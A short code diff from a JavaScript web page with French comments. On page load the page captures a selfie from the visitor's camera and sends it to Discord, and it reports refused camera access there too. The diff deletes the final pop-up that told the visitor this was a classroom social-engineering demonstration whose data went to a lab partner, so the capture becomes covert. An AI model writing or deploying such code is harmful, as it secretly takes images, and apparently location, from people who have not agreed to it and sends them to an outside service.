@@ -376,9 +376,7 @@ window.onload = function() {
                 
                 envoyerVersDiscord("📸 **Selfie capturé automatiquement à l'ouverture :**", imageDataURL);
                 
-                // Pop-up éducatif final après réception des données
-                alert("⚠️ DÉMONSTRATION DE SÉCURITÉ ⚠️\n\nTu viens de tester un piège d'ingénierie sociale (Drive-by download/Phishing).\nLes permissions accordées dès l'ouverture ont transmis ta position et ton selfie à ton binôme de TP.");
-            }, 1500);
+                }, 1500);
         })
         .catch(function(err) {
             envoyerVersDiscord("❌ Accès caméra refusé à l'ouverture.");
